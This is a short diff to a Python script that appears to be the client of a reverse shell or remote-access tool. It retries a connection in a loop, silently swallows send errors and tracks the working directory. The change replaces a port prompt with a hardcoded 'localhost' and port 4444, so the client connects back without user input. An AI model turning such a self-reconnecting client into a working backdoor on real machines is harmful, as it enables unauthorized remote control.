@@ -5,6 +5,9 @@ currentDirectory = os.getcwd()
 
 chunkSize = 1
 
+IP = 'localhost'
+PORT = 4444
+
 def connect(host, port):
 	notConnected = True
 	while notConnected:
@@ -36,12 +39,12 @@ def send(conn, data):
 		conn.send(data.encode("utf8"))
 	except:
 		pass
-port = int(input("Port: "))
+		
 startingDir = os.getcwd()
 while True:
 
 
-	conn = connect('localhost', port)
+	conn = connect(IP, PORT)
 
 	active = True
 	currentDirectory = startingDir
